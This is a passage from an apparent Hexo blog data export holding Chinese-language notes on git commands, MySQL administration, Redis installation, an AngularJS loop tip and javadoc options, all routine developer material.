--hard`：彻底回退到某个版本，本地的源码也会变为上一个版本的内容\n\n\n## 4. 创建分支\ngit branch develop\n\n\n## 5. 切换分支\ngit checkout develop\n\n<!-- more -->\n\n## 6. 查看分支版本\ngit branch\ngit branch -v\ngit branch -r\n\n\n## 7. 项目多模块更新\ngit submodule init\ngit submodule update\ngit submodule status\n\n\n## 8. 修改最近一次提交\n``` shell\ngit commit -m 'initial commit'\ngit add forgotten_file\ngit commit --amend\n```\n\n\n## 9. git ssh配置\n密钥&公钥对生成(默认生成位置为：~/.ssh)：\nssh-keygen -t rsa -C \"yeshaoting@163.com\"\n\n**说明**：\nid_rsa是密钥，如同个人密码一般，别人拿到这个就能以你的身份登录git。\nid_rsa.pub是公钥，用于在服务器端注册。当访问远程服务器时，远程服务器会拿着他那端的公钥与本机的密钥匹配，成功即可无密码访问。\n\n测试命令：\n> git -T User@Host\n\n### git配置优先顺序\nlocal > global > system\nlocal：项目目录/.git/config\nglobal：当前用户目录/.gitconfig\nsystem：/etc/gitconfig\n\n\n## 10.配置值获取\nconfig demo：\n[user]\n        name = shaotingye\n        email = shaotingye@sohu-inc.com\n\n获取命令为：\n> git config --get user.email\n\n\n## 11. git 放弃本地修改 强制更新\n``` shell\ngit fetch --all\ngit reset --hard origin/master\n```\n\n参考：http://blog.csdn.net/a06062125/article/details/11727273","slug":"article/git/git命令小记","published":1,"updated":"2016-03-31T15:13:33.000Z","_id":"cilpxkgch005mavbty17q9awb","comments":1,"layout":"post","photos":[],"link":""},{"title":"mysql数据库命令小记","date":"2015-12-29T05:58:00.000Z","_content":"\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 查看innodb引擎状态\n可用于查看死锁情况：\nshow engine innodb status;\n\n## 查看锁情况\n表锁：show global status like 'table_locks%';\n行锁：show global status like 'innodb_row_lock%';\n\n\n## 文件打开数\nshow global status like 'open_files';\n\n\n## 查看慢查询\nshow full processlist;\nSELECT * FROM information_schema.INNODB_TRX;\nselect @@autocommit;\n\n\n## 设置对应的编码\nset character_set_server=utf8;\n\n\n## 查看数据库编码\nSHOW VARIABLES LIKE 'character%';\n\n<!-- more -->\n\n## 查看日期毫秒数\nselect unix_timestamp('2009-10-26 10:06:07');\n\n\n## 查看日期\nselect from_unixtime(1430211829676/1000);\n\n\n## 查看表索引\nshow index from table;\n\n\n## 查看数据库表字段\nselect COLUMN_NAME from information_schema.COLUMNS\nwhere table_name = 'channel_movie' \nand table_schema = 'movie_ticket';\n\n\n## 数据库事务隔离级别\n\n### 查看当前会话隔离级别\nselect @@tx_isolation;\n\n### 查看系统当前隔离级别\nselect @@global.tx_isolation;\n\n### 设置当前会话隔离级别\nset session transaction isolatin level repeatable read;\n\n### 设置系统当前隔离级别\nset global transaction isolation level repeatable read;\n\n\n## 显示数据表索引\nshow index from user_login_status;\n\n\n## 删除重复数据（性能不佳）\n``` sql\nset sql_safe_updates=0;\ndelete from netnews.item\nwhere id not in (\n     select id from (\n          select  min(id) as id from netnews.item group by channel_id, link\n     ) as tab\n);\nset sql_safe_updates=1;\n```\n\n\n## 安全更新状态修改\n关闭：set sql_safe_updates=0;\n打开：set sql_safe_updates=1;\n\n\n## 查看mysql系统状态\nshow status\nshow processlist\n\n\n## 临时修改内容显示字符集\ncharset utf8\n\n\n## 修改索引\nALTER TABLE `babel_idea`.`i_product_owner`\nDROP INDEX `name_UNIQUE` ,\nADD UNIQUE INDEX `unique_product_owner_name` (`name` ASC);\n\n\n## 显示索引\nshow index from i_product;\n\n\n## 删除索引\nalter table i_product drop index fk_product_deleted_idx;\n\n\n## 按条件导出mysql表数据\n`mysqldump -u root -p 数据库名 --no-create-db=TRUE --no-create-info=TRUE --add-drop-table=FALSE --where=\"id >1000\" 表明>导出文件名.sql`\n\n\n## mysqldump数据导入\nmysqldump babel_idea < babel_idea.sql\n\n\n## 启用safe mode(update, delete, select操作需要包含主键的where条件)\nset sql_safe_updates=1;\n\n\n## 关闭safe mode\nset sql_safe_updates=0;\n\n\n## 修改表字段\nalter table i_product\nadd column `deleted` tinyint not null\ndefault 0\ncomment '逻辑删除，是否已删除(0: 未删除，1: 删除)';\n\n\n\n## 添加索引\n\n### 添加单一索引\nalter table i_product\ndrop index `fk_product_product_idx`;\n\n### 添加联合索引\nalter table i_product\nadd index `fk_product_id_parent_idx`\n(id, parent);\n\n\n## 创建数据库(设置默认字符集)\ncreate database `babel_idea` DEFAULT CHARACTER SET utf8;\n\n\n## 只导出数据库数据表结构\n~/local/mysql/bin/mysqldump -ubkmadmin -pbkmadmin -t babel_idea > ~/babel_idea.schema.sql\n\n","source":"_posts/article/database/mysql数据库命令小记.md","raw":"categories:\n  - 数据存储\ntags:\n  - mysql\n  - 小记\n  - 命令\ntitle: mysql数据库命令小记\ndate: 2015-12-29 13:58:00\n---\n\n<img src=\"/asserts/images/logo/mysql.png\" class=\"img-logo img-center\" />\n\n\n## 查看innodb引擎状态\n可用于查看死锁情况：\nshow engine innodb status;\n\n## 查看锁情况\n表锁：show global status like 'table_locks%';\n行锁：show global status like 'innodb_row_lock%';\n\n\n## 文件打开数\nshow global status like 'open_files';\n\n\n## 查看慢查询\nshow full processlist;\nSELECT * FROM information_schema.INNODB_TRX;\nselect @@autocommit;\n\n\n## 设置对应的编码\nset character_set_server=utf8;\n\n\n## 查看数据库编码\nSHOW VARIABLES LIKE 'character%';\n\n<!-- more -->\n\n## 查看日期毫秒数\nselect unix_timestamp('2009-10-26 10:06:07');\n\n\n## 查看日期\nselect from_unixtime(1430211829676/1000);\n\n\n## 查看表索引\nshow index from table;\n\n\n## 查看数据库表字段\nselect COLUMN_NAME from information_schema.COLUMNS\nwhere table_name = 'channel_movie' \nand table_schema = 'movie_ticket';\n\n\n## 数据库事务隔离级别\n\n### 查看当前会话隔离级别\nselect @@tx_isolation;\n\n### 查看系统当前隔离级别\nselect @@global.tx_isolation;\n\n### 设置当前会话隔离级别\nset session transaction isolatin level repeatable read;\n\n### 设置系统当前隔离级别\nset global transaction isolation level repeatable read;\n\n\n## 显示数据表索引\nshow index from user_login_status;\n\n\n## 删除重复数据（性能不佳）\n``` sql\nset sql_safe_updates=0;\ndelete from netnews.item\nwhere id not in (\n     select id from (\n          select  min(id) as id from netnews.item group by channel_id, link\n     ) as tab\n);\nset sql_safe_updates=1;\n```\n\n\n## 安全更新状态修改\n关闭：set sql_safe_updates=0;\n打开：set sql_safe_updates=1;\n\n\n## 查看mysql系统状态\nshow status\nshow processlist\n\n\n## 临时修改内容显示字符集\ncharset utf8\n\n\n## 修改索引\nALTER TABLE `babel_idea`.`i_product_owner`\nDROP INDEX `name_UNIQUE` ,\nADD UNIQUE INDEX `unique_product_owner_name` (`name` ASC);\n\n\n## 显示索引\nshow index from i_product;\n\n\n## 删除索引\nalter table i_product drop index fk_product_deleted_idx;\n\n\n## 按条件导出mysql表数据\n`mysqldump -u root -p 数据库名 --no-create-db=TRUE --no-create-info=TRUE --add-drop-table=FALSE --where=\"id >1000\" 表明>导出文件名.sql`\n\n\n## mysqldump数据导入\nmysqldump babel_idea < babel_idea.sql\n\n\n## 启用safe mode(update, delete, select操作需要包含主键的where条件)\nset sql_safe_updates=1;\n\n\n## 关闭safe mode\nset sql_safe_updates=0;\n\n\n## 修改表字段\nalter table i_product\nadd column `deleted` tinyint not null\ndefault 0\ncomment '逻辑删除，是否已删除(0: 未删除，1: 删除)';\n\n\n\n## 添加索引\n\n### 添加单一索引\nalter table i_product\ndrop index `fk_product_product_idx`;\n\n### 添加联合索引\nalter table i_product\nadd index `fk_product_id_parent_idx`\n(id, parent);\n\n\n## 创建数据库(设置默认字符集)\ncreate database `babel_idea` DEFAULT CHARACTER SET utf8;\n\n\n## 只导出数据库数据表结构\n~/local/mysql/bin/mysqldump -ubkmadmin -pbkmadmin -t babel_idea > ~/babel_idea.schema.sql\n\n","slug":"article/database/mysql数据库命令小记","published":1,"updated":"2016-04-06T07:59:50.000Z","_id":"cilpxkgcj005ravbtn29nn8f0","comments":1,"layout":"post","photos":[],"link":""},{"title":"redis单机多实例部署","date":"2015-12-29T05:58:00.000Z","_content":"\n[TOC]\n\n## 一、redis安装\n\n## Redis介绍\nRedis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表、哈希、集合和有序集合5种。支持在服务器端计算集合的并、交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。\n\n### 1. 下载redis\n``` shell\ncd /opt/work/local\n\nwget -c http://download.redis.io/releases/redis-3.0.3.tar.gz\ntar -zxvf redis-3.0.3.tar.gz\n```\n解压后的文件目录如下：\n![解压后的Redis目录结构](http://images.cnitblog.com/i/420264/201404/191557148074939.jpg)\n\n### 2. 编译redis\n``` shell\ncd /opt/work/local/redis-3.0.3\nmake\n```\n\n### 3. 拷贝产生的可执行命令\n``` shell\nmkdir -p /opt/work/local/redis/bin\ncd /opt/work/local/redis-3.0.3/src\ncp -p redis-benchmark redis-check-aof redis-check-dump redis-cli redis-sentinel redis-server mkreleasehdr.sh /opt/work/local/redis/bin\n```\n\n### 4. redis服务启动\n(1) 修改环境变量(vim  ~/.bash_profile)如下：\n``` shell\nREDIS_HOME=/opt/work/local/redis\n\nPATH=$PATH:$HOME/bin:$REDIS_HOME/bin\n```\n\n(2) 修改完成后，记得使用`source ~/.bash_profile`生效。\n\n(3) 查看redis-server使用文档\n``` shell\n[@zw_25_105 local]# redis-server --help\nUsage: ./redis-server [/path/to/redis.conf] [options]\n       ./redis-server - (read config from stdin)\n       ./redis-server -v or --version\n       ./redis-server -h or --help\n       ./redis-server --test-memory <megabytes>\n\nExamples:\n       ./redis-server (run the server with default conf)\n       ./redis-server /etc/redis/6379.conf\n       ./redis-server --port 7777\n       ./redis-server --port 7777 --slaveof 127.0.0.1 8888\n       ./redis-server /etc/myredis.conf --loglevel verbose\n\nSentinel mode:\n       ./redis-server /etc/sentinel.conf --sentinel\n```\n\n(4) 启动单机redis\n使用默认的参数启动redis：`redis-server`\n指定端口启动redis：`redis-server --port 6380`\n\n(5) 允许redis端口远程连接\n修改防火墙配置文件，如下所示：\n``` shell\nvim /etc/sysconfig/iptables\n\n# 添加一行\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 6380 -j ACCEPT\n\n# 重新加载规则\nservice iptables restart\n```\n\n至此你就可以用客户端redis-cli连接了：`redis-cli -h 127.0.0.1 -p 6380`\n\n<!-- more -->\n\n## 二、redis主从配置\n\n\n## 三、redis sentinel配置\n\n\n\n\n\n## 四、参考文档：\n[Redis安装及主从配置](!http://www.cnblogs.com/liuling/p/2014-4-19-02.html)\n[centos 安装redis（一台机器可以安装多个redis）](!http://www.cnblogs.com/eric-z/p/4153101.html)\n[在一台机器上搭建多个redis实例](!http://my.oschina.net/liuke1556/blog/287594)\n","source":"_posts/article/cache/redis单机多实例部署.md","raw":"categories:\n  - 数据存储\ntitle: redis单机多实例部署\ntags:\n  - redis\n  - cache\ndate: 2015-12-29 13:58:00\n---\n\n[TOC]\n\n## 一、redis安装\n\n## Redis介绍\nRedis是一种高级key-value数据库。它跟memcached类似，不过数据可以持久化，而且支持的数据类型很丰富。有字符串，链表、哈希、集合和有序集合5种。支持在服务器端计算集合的并、交和补集(difference)等，还支持多种排序功能。所以Redis也可以被看成是一个数据结构服务器。Redis的所有数据都是保存在内存中，然后不定期的通过异步方式保存到磁盘上(这称为“半持久化模式”)；也可以把每一次数据变化都写入到一个append only file(aof)里面(这称为“全持久化模式”)。\n\n### 1. 下载redis\n``` shell\ncd /opt/work/local\n\nwget -c http://download.redis.io/releases/redis-3.0.3.tar.gz\ntar -zxvf redis-3.0.3.tar.gz\n```\n解压后的文件目录如下：\n![解压后的Redis目录结构](http://images.cnitblog.com/i/420264/201404/191557148074939.jpg)\n\n### 2. 编译redis\n``` shell\ncd /opt/work/local/redis-3.0.3\nmake\n```\n\n### 3. 拷贝产生的可执行命令\n``` shell\nmkdir -p /opt/work/local/redis/bin\ncd /opt/work/local/redis-3.0.3/src\ncp -p redis-benchmark redis-check-aof redis-check-dump redis-cli redis-sentinel redis-server mkreleasehdr.sh /opt/work/local/redis/bin\n```\n\n### 4. redis服务启动\n(1) 修改环境变量(vim  ~/.bash_profile)如下：\n``` shell\nREDIS_HOME=/opt/work/local/redis\n\nPATH=$PATH:$HOME/bin:$REDIS_HOME/bin\n```\n\n(2) 修改完成后，记得使用`source ~/.bash_profile`生效。\n\n(3) 查看redis-server使用文档\n``` shell\n[@zw_25_105 local]# redis-server --help\nUsage: ./redis-server [/path/to/redis.conf] [options]\n       ./redis-server - (read config from stdin)\n       ./redis-server -v or --version\n       ./redis-server -h or --help\n       ./redis-server --test-memory <megabytes>\n\nExamples:\n       ./redis-server (run the server with default conf)\n       ./redis-server /etc/redis/6379.conf\n       ./redis-server --port 7777\n       ./redis-server --port 7777 --slaveof 127.0.0.1 8888\n       ./redis-server /etc/myredis.conf --loglevel verbose\n\nSentinel mode:\n       ./redis-server /etc/sentinel.conf --sentinel\n```\n\n(4) 启动单机redis\n使用默认的参数启动redis：`redis-server`\n指定端口启动redis：`redis-server --port 6380`\n\n(5) 允许redis端口远程连接\n修改防火墙配置文件，如下所示：\n``` shell\nvim /etc/sysconfig/iptables\n\n# 添加一行\n-A INPUT -m state --state NEW -m tcp -p tcp --dport 6380 -j ACCEPT\n\n# 重新加载规则\nservice iptables restart\n```\n\n至此你就可以用客户端redis-cli连接了：`redis-cli -h 127.0.0.1 -p 6380`\n\n<!-- more -->\n\n## 二、redis主从配置\n\n\n## 三、redis sentinel配置\n\n\n\n\n\n## 四、参考文档：\n[Redis安装及主从配置](!http://www.cnblogs.com/liuling/p/2014-4-19-02.html)\n[centos 安装redis（一台机器可以安装多个redis）](!http://www.cnblogs.com/eric-z/p/4153101.html)\n[在一台机器上搭建多个redis实例](!http://my.oschina.net/liuke1556/blog/287594)\n","slug":"article/cache/redis单机多实例部署","published":1,"updated":"2016-03-31T07:18:03.000Z","_id":"cilpxkgcm005yavbti29tmcm8","comments":1,"layout":"post","photos":[],"link":""},{"date":"2016-02-15T07:27:08.000Z","title":"replace into实践","_content":"\n## 用法简介\n查阅mysql官方[参考文档](http://dev.mysql.com/doc/refman/5.7/en/replace.html)，有如下二段内容：\n> REPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. See Section 13.2.5, “INSERT Syntax”.\n大致意思是：replace用法与insert比较像，只是如果表中的一个旧行具有相同的值作为一个主键或唯一索引的新行，插入新行之前旧的行被删除。\n\n\n\n> REPLACE is a MySQL extension to the SQL standard. It either inserts, or deletes and inserts. For another MySQL extension to standard SQL—that either inserts or updates—see Section 13.2.5.3, “INSERT ... ON DUPLICATE KEY UPDATE Syntax”.\n\n\n## 参考文档\n1. [Mysql中replace into用法详细说明](http://my.oschina.net/junn/blog/110213?fromerr=8w7ArO5a)\n2. [语法：MySQL中INSERT IGNORE INTO和REPLACE INTO的使用](http://www.cnblogs.com/RoadGY/archive/2011/09/28/2193733.html)\n3. [sql replace into 用法与实现语句](http://www.111cn.net/database/mysql/41017.htm)\n\n\n","source":"_drafts/article/database/replace into实践.md","raw":"date: 2016-02-15 15:27:08\ntitle: replace into实践\n---\n\n## 用法简介\n查阅mysql官方[参考文档](http://dev.mysql.com/doc/refman/5.7/en/replace.html)，有如下二段内容：\n> REPLACE works exactly like INSERT, except that if an old row in the table has the same value as a new row for a PRIMARY KEY or a UNIQUE index, the old row is deleted before the new row is inserted. See Section 13.2.5, “INSERT Syntax”.\n大致意思是：replace用法与insert比较像，只是如果表中的一个旧行具有相同的值作为一个主键或唯一索引的新行，插入新行之前旧的行被删除。\n\n\n\n> REPLACE is a MySQL extension to the SQL standard. It either inserts, or deletes and inserts. For another MySQL extension to standard SQL—that either inserts or updates—see Section 13.2.5.3, “INSERT ... ON DUPLICATE KEY UPDATE Syntax”.\n\n\n## 参考文档\n1. [Mysql中replace into用法详细说明](http://my.oschina.net/junn/blog/110213?fromerr=8w7ArO5a)\n2. [语法：MySQL中INSERT IGNORE INTO和REPLACE INTO的使用](http://www.cnblogs.com/RoadGY/archive/2011/09/28/2193733.html)\n3. [sql replace into 用法与实现语句](http://www.111cn.net/database/mysql/41017.htm)\n\n\n","slug":"article/database/replace into实践","published":0,"updated":"2016-02-15T08:21:18.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cilpxkgct0063avbt7t6llxu9"},{"title":"mysql LATEST DETECTED DEADLOCK","date":"2015-12-29T12:46:00.000Z","_content":"\n# mysql LATEST DETECTED DEADLOCK\n\n``` sql\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n130819 14:01:12\n*** (1) TRANSACTION:\nTRANSACTION 0 108626388, ACTIVE 0 sec, process no 8726, OS thread id 47220783470912\nstarting index read\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1216, 2 row lock(s), undo log entries 1\nMySQL thread id 4283, query id 21974219 10.92.210.108 ddrsrbe Updating\nupdate ddrsproduction.requests set request_priority_grade_id=3, costs=0, data_version=1, date_completed='2013-08-19 13:59:39', date_end='2013-05-24 23:59:00', date_required_by='2013-08-26 13:57:31', date_start='2013-05-19 00:01:00', date_submitted='2013-08-19 13:57:31', designated_authority_id=84528, is_manual=1, missed_sla_reason=null, missed_sla_reason_ask_user=null, product_id=35, request_cost_status_id=0, request_delivery_method_id=0, request_legislation_id=0, request_method_id=0, request_reason_id=1, request_result_status_id=null, origin_id=0, request_status_id=2, request_type_id=1, result_row_count=2, results_last_downloaded=null, site_processed='KNOW', time_zone=null, urn='LBP/281/35/12 (CONS)', user_id=2357, vf_rep_id=8 where request_id=132536\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\n```\n\n参见：\n[MySQL Innodb Deadlock - how to remove old event?](http://stackoverflow.com/questions/21573684/mysql-innodb-deadlock-how-to-remove-old-event)\n[How can I stop a running MySQL query?](http://stackoverflow.com/questions/3787651/how-can-i-stop-a-running-mysql-query)\n[mysql thread入门分析](http://blog.csdn.net/wyzxg/article/details/8258033)\n[MySQL查询阻塞语句](http://blog.itpub.net/29254281/viewspace-1420158/)\n[如何 查找 mysql 中如何 kill 引起死锁的线程id](http://zhidao.baidu.com/link?url=Dbx5nrJ-HniRjqzX4UvKkXdoIAhUwCsMfriWuVBZFPTtNfkTWxQYtFz6WFNM54STI3AhdNkzP7QduoJNKTlPIfSHsLtv6Ql63lyDKmq9qT3)\n[Trying to understand MySQL deadlock on InnoDB table](http://stackoverflow.com/questions/11331029/trying-to-understand-mysql-deadlock-on-innodb-table)\n","source":"_drafts/article/database/mysql LATEST DETECTED DEADLOCK.md","raw":"title: mysql LATEST DETECTED DEADLOCK\ntags:\n  - mysql\ncategories:\n  - mysql\ndate: 2015-12-29 20:46:00\n---\n\n# mysql LATEST DETECTED DEADLOCK\n\n``` sql\n------------------------\nLATEST DETECTED DEADLOCK\n------------------------\n130819 14:01:12\n*** (1) TRANSACTION:\nTRANSACTION 0 108626388, ACTIVE 0 sec, process no 8726, OS thread id 47220783470912\nstarting index read\nmysql tables in use 1, locked 1\nLOCK WAIT 4 lock struct(s), heap size 1216, 2 row lock(s), undo log entries 1\nMySQL thread id 4283, query id 21974219 10.92.210.108 ddrsrbe Updating\nupdate ddrsproduction.requests set request_priority_grade_id=3, costs=0, data_version=1, date_completed='2013-08-19 13:59:39', date_end='2013-05-24 23:59:00', date_required_by='2013-08-26 13:57:31', date_start='2013-05-19 00:01:00', date_submitted='2013-08-19 13:57:31', designated_authority_id=84528, is_manual=1, missed_sla_reason=null, missed_sla_reason_ask_user=null, product_id=35, request_cost_status_id=0, request_delivery_method_id=0, request_legislation_id=0, request_method_id=0, request_reason_id=1, request_result_status_id=null, origin_id=0, request_status_id=2, request_type_id=1, result_row_count=2, results_last_downloaded=null, site_processed='KNOW', time_zone=null, urn='LBP/281/35/12 (CONS)', user_id=2357, vf_rep_id=8 where request_id=132536\n*** (1) WAITING FOR THIS LOCK TO BE GRANTED:\n```\n\n参见：\n[MySQL Innodb Deadlock - how to remove old event?](http://stackoverflow.com/questions/21573684/mysql-innodb-deadlock-how-to-remove-old-event)\n[How can I stop a running MySQL query?](http://stackoverflow.com/questions/3787651/how-can-i-stop-a-running-mysql-query)\n[mysql thread入门分析](http://blog.csdn.net/wyzxg/article/details/8258033)\n[MySQL查询阻塞语句](http://blog.itpub.net/29254281/viewspace-1420158/)\n[如何 查找 mysql 中如何 kill 引起死锁的线程id](http://zhidao.baidu.com/link?url=Dbx5nrJ-HniRjqzX4UvKkXdoIAhUwCsMfriWuVBZFPTtNfkTWxQYtFz6WFNM54STI3AhdNkzP7QduoJNKTlPIfSHsLtv6Ql63lyDKmq9qT3)\n[Trying to understand MySQL deadlock on InnoDB table](http://stackoverflow.com/questions/11331029/trying-to-understand-mysql-deadlock-on-innodb-table)\n","slug":"article/database/mysql LATEST DETECTED DEADLOCK","published":0,"updated":"2016-02-01T02:55:37.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cilpxkgcu0064avbt6w1zy3mp"},{"title":"redis使用手记","date":"2015-12-29T05:58:00.000Z","_content":"\n# redis使用手记\n\n## 服务监控\n\n## 性能测试\n\n1. redis-cli monitor\n使用如下命令查看redis GET/SET请求的频率\nredis-cli monitor | grep \"GET\"\nredis-cli monitor | grep \"SET\"\n\n","source":"_drafts/article/cache/redis使用手记.md","raw":"categories:\n  - cache\ntags:\n  - redis\ntitle: redis使用手记\ndate: 2015-12-29 13:58:00\n---\n\n# redis使用手记\n\n## 服务监控\n\n## 性能测试\n\n1. redis-cli monitor\n使用如下命令查看redis GET/SET请求的频率\nredis-cli monitor | grep \"GET\"\nredis-cli monitor | grep \"SET\"\n\n","slug":"article/cache/redis使用手记","published":0,"updated":"2016-02-01T03:11:36.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cilpxkgcw0068avbtwx3hvkvo"},{"title":"angularjs循环指定次数","date":"2016-03-13T02:16:00.000Z","_content":"\n<img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" />\n\n\n## 一、js代码\n``` javascript\n$scope.range = function(n) {\n    return new Array(n);\n};\n```\n通过new Array(n)创建指定大小容量的数组。\n\n\n## 二、html代码\n``` html\n<div class=\"list-group-horizontal\">\n  <a ng-repeat=\"i in range(6) track by $index\">\n\t<span ng-bind=\"$index + 1\"></span>\n  </a>\n</div>\n```\n\n遍历数组，并通过track by $index来指定数组索引为$index。\n\n\n## 三、输出结果\n输出结果为：1 2 3 4 5 6\n\n\n## 四、参考文档\n[Way to ng-repeat defined number of times instead of repeating over array?](http://stackoverflow.com/questions/16824853/way-to-ng-repeat-defined-number-of-times-instead-of-repeating-over-array)\n","source":"_posts/article/js/angularjs循环指定次数.md","raw":"title: angularjs循环指定次数\ntags:\n  - angularjs\ncategories:\n  - 前端设计\ndate: 2016-03-13 10:16:00\n---\n\n<img src=\"/asserts/images/logo/angularjs.png\" class=\"img-logo img-center\" />\n\n\n## 一、js代码\n``` javascript\n$scope.range = function(n) {\n    return new Array(n);\n};\n```\n通过new Array(n)创建指定大小容量的数组。\n\n\n## 二、html代码\n``` html\n<div class=\"list-group-horizontal\">\n  <a ng-repeat=\"i in range(6) track by $index\">\n\t<span ng-bind=\"$index + 1\"></span>\n  </a>\n</div>\n```\n\n遍历数组，并通过track by $index来指定数组索引为$index。\n\n\n## 三、输出结果\n输出结果为：1 2 3 4 5 6\n\n\n## 四、参考文档\n[Way to ng-repeat defined number of times instead of repeating over array?](http://stackoverflow.com/questions/16824853/way-to-ng-repeat-defined-number-of-times-instead-of-repeating-over-array)\n","slug":"article/js/angularjs循环指定次数","published":1,"updated":"2016-03-31T15:08:36.000Z","_id":"cilpybfby0000hnbt6x16sks9","comments":1,"layout":"post","photos":[],"link":""},{"title":"生成javadoc文档","date":"2016-03-11T10:33:00.000Z","_content":"\n<img src=\"/asserts/images/logo/java.png\" class=\"img-logo img-center\" />\n\n\n## 一、查看javadoc帮助文档\n\n``` bash\nyerba-buena:~ yeshaoting$ javadoc --help\njavadoc: 错误 - 无效的标记: --help\n用法: javadoc [options] [packagenames] [sourcefiles] [@files]\n  -overview <file>                 从 HTML 文件读取概览文档\n  -public                          仅显示 public 类和成员\n  -protected                       显示 protected/public 类和成员 (默认值)\n  -package                         显示 package/protected/public 类和成员\n  -private                         显示所有类和成员\n  -help                            显示命令行选项并退出\n  -doclet <class>                  通过替代 doclet 生成输出\n  -docletpath <path>               指定查找 doclet 类文件的位置\n  -sourcepath <pathlist>           指定查找源文件的位置\n  -classpath <pathlist>            指定查找用户类文件的位置\n  -cp <pathlist>                   指定查找用户类文件的位置\n  -exclude <pkglist>               指定要排除的程序包列表\n  -subpackages <subpkglist>        指定要递归加载的子程序包\n  -breakiterator                   计算带有 BreakIterator 的第一个语句\n  -bootclasspath <pathlist>        覆盖由引导类加载器所加载的\n                                   类文件的位置\n  -source <release>                提供与指定发行版的源兼容性\n  -extdirs <dirlist>               覆盖所安装扩展的位置\n  -verbose                         输出有关 Javadoc 正在执行的操作的信息\n  -locale <name>                   要使用的区域设置, 例如 en_US 或 en_US_WIN\n  -encoding <name>                 源文件编码名称\n  -quiet                           不显示状态消息\n  -J<flag>                         直接将 <flag> 传递到运行时系统\n  -X                               输出非标准选项的提要\n\n通过标准 doclet 提供:\n  -d <directory>                   输出文件的目标目录\n  -use                             创建类和程序包用法页面\n  -version                         包含 @version 段\n  -author                          包含 @author 段\n  -docfilessubdirs                 递归复制文档文件子目录\n  -splitindex                      将索引分为每个字母对应一个文件\n  -windowtitle <text>              文档的浏览器窗口标题\n  -doctitle <html-code>            包含概览页面的标题\n  -header <html-code>              包含每个页面的页眉文本\n  -footer <html-code>              包含每个页面的页脚文本\n  -top    <html-code>              包含每个页面的顶部文本\n  -bottom <html-code>              包含每个页面的底部文本\n  -link <url>                      创建指向位于 <url> 的 javadoc 输出的链接\n  -linkoffline <url> <url2>        利用位于 <url2> 的程序包列表链接至位于 <url> 的文档\n  -excludedocfilessubdir <name1>:.. 排除具有给定名称的所有文档文件子目录。\n  -group <name> <p1>:<p2>..        在概览页面中, 将指定的程序包分组\n  -nocomment                       不生成说明和标记, 只生成声明。\n  -nodeprecated                    不包含 @deprecated 信息\n  -noqualifier <name1>:<name2>:... 输出中不包括指定限定符的列表。\n  -nosince                         不包含 @since 信息\n  -notimestamp                     不包含隐藏时间戳\n  -nodeprecatedlist                不生成已过时的列表\n  -notree                          不生成类分层结构\n  -noindex                         不生成索引\n  -nohelp                          不生成帮助链接\n  -nonavbar                        不生成导航栏\n  -serialwarn                      生成有关 @serial 标记的警告\n  -tag <name>:<locations>:<header> 指定单个参数定制标记\n  -taglet                          要注册的 Taglet 的全限定名称\n  -tagletpath                      Taglet 的路径\n  -charset <charset>               用于跨平台查看生成的文档的字符集。\n  -helpfile <file>                 包含帮助链接所链接到的文件\n  -linksource                      以 HTML 格式生成源文件\n  -sourcetab <tab length>          指定源中每个制表符占据的空格数\n  -keywords                        使程序包, 类和成员信息附带 HTML 元标记\n  -stylesheetfile <path>           用于更改生成文档的样式的文件\n  -docencoding <name>              指定输出的字符编码\n```\n\n<!-- more -->\n\n## 二、命令举例\n\n``` bash\n# 输出所有cn.yeshaoting.jvwa包及子包\njavadoc cn.yeshaoting.jvwa * -subpackages * -d ~/doc\n\n# 输出所有cn.yeshaoting.jvwa下指定子包\njavadoc cn.yeshaoting.jvwa * -subpackages cn.yeshaoting.jvwa.web cn.yeshaoting.jvwa.util -d ~/doc\n\n# 输出所有cn.yeshaoting.jvwa下 package/protected/public 类和成员(默认值 -protected：只显示 protected/public 类和成员)\njavadoc cn.yeshaoting.jvwa * -package -d ~/doc\n```\n\n\n## 三、自定义标签\n自定义标签输出到javadoc文档中，可以通过参数-tag来完成。\njavadoc帮助文档说明如下：\n> `-tag <name>:<locations>:<header> 指定单个参数定制标记`\n\n其中，name表示标签名称，locations表示处理标签所在的位置，header表示标签显示名。\n另外，locations官方解释如下：\n> Placement of tags - The Xaoptcmf part of the argument determines where in the source code the tag is allowed to be placed, and whether the tag can be disabled (using X). You can supply either a, to allow the tag in all places, or any combination of the other letters:\nX (disable tag)\na (all)\no (overview)\np (packages)\nt (types, that is classes and interfaces)\nc (constructors)\nm (methods)\nf (fields)\n\n一般地，直接使用a即可。\n\n\n### 举例\n``` bash\njavadoc cn.yeshaoting.jvwa * -tag \"api.name\":a:\"接口名：\" -tag \"api.apiId\":a:\"api id：\" -tag \"api.description\":a:\"接口描述：\" -tag \"api.category\":a:\"所属应用：\" -tag \"api.param\":a:\"参数：\" -tag \"api.result\":a\"返回结果：\" -tag \"api.requestExample\":a:\"请求实例：\" -tag \"api.responseExample\":a:\"响应实例：\" -tag \"api.errorExample\":a:\"错误实例：\" -d ~/doc\n```\n**注**：程序中标签声明形如：@api.name，@api.description，@datetime。\n\n\n## 四、生成chm文档\n可参考：[Javadoc转换chm帮助文档的四种方法总结](http://www.blogjava.net/lishunli/archive/2010/01/07/308618.html#_Toc250550551)\n\n\n## 五、参考文档\n- [如何个性化地生成Javadoc文档](http://www.blogjava.net/lishunli/archive/2010/01/12/309218.html)\n- [如何自动生成javadoc及添加自定义标签 ](http://blog.sina.com.cn/s/blog_6e371452010177dj.html)\n- [多模块Maven项目如何使用javadoc插件生成文档](http://blog.csdn.net/jianxin1009/article/details/35269501)\n- 